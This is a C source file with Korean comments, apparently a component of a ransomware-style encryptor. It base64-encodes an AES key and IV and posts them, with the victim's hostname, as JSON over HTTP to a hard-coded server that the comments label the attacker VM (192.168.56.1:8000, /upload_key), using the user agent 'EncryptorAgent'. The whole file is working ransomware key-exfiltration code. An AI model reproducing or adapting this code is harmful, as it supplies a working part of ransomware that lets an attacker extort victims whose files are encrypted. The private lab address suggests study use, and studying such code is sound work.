#include "key_sender.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wininet.h>
#include <openssl/evp.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")

#define SERVER_IP "192.168.56.1"   // 공격자 VM IP
#define SERVER_PORT 8000
#define SERVER_PATH "/upload_key"

#define AES_KEY_SIZE 16

// ======== 내부 함수 ========

// Base64 인코딩
static char* base64_encode(const unsigned char* buffer, size_t length) {
    BIO* bio, * b64;
    BUF_MEM* bufferPtr;

    b64 = BIO_new(BIO_f_base64());
    bio = BIO_new(BIO_s_mem());
    b64 = BIO_push(b64, bio);

    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL); // 개행 제거
    BIO_write(b64, buffer, length);
    BIO_flush(b64);
    BIO_get_mem_ptr(b64, &bufferPtr);

    char* b64text = (char*)malloc(bufferPtr->length + 1);
    if (b64text) {
        memcpy(b64text, bufferPtr->data, bufferPtr->length);
        b64text[bufferPtr->length] = '\0';
    }

    BIO_free_all(b64);
    return b64text;
}

// HTTP POST 전송
static int send_http_post(const char* data) {
    HINTERNET hInternet, hConnect;
    BOOL bRequest;

    hInternet = InternetOpenA("EncryptorAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return 0;

    hConnect = InternetConnectA(hInternet, SERVER_IP, SERVER_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return 0;
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", SERVER_PATH, NULL, NULL, NULL,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 0;
    }

    const char* headers = "Content-Type: application/json\r\n";
    bRequest = HttpSendRequestA(hRequest, headers, strlen(headers), (LPVOID)data, strlen(data));

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return bRequest;
}

// ======== 외부 인터페이스 ========

// 키와 IV를 서버로 전송
int send_key_to_server(const char* hostname, const unsigned char* key, const unsigned char* iv) {
    char* encoded_key = base64_encode(key, AES_KEY_SIZE);
    char* encoded_iv = base64_encode(iv, AES_KEY_SIZE);

    if (!encoded_key || !encoded_iv) {
        if (encoded_key) free(encoded_key);
        if (encoded_iv) free(encoded_iv);
        return 0;
    }

    char postData[2048];
    snprintf(postData, sizeof(postData),
        "{\"hostname\":\"%s\",\"key\":\"%s\",\"iv\":\"%s\"}",
        hostname, encoded_key, encoded_iv);

    int result = send_http_post(postData);

    free(encoded_key);
    free(encoded_iv);

    return result;
}
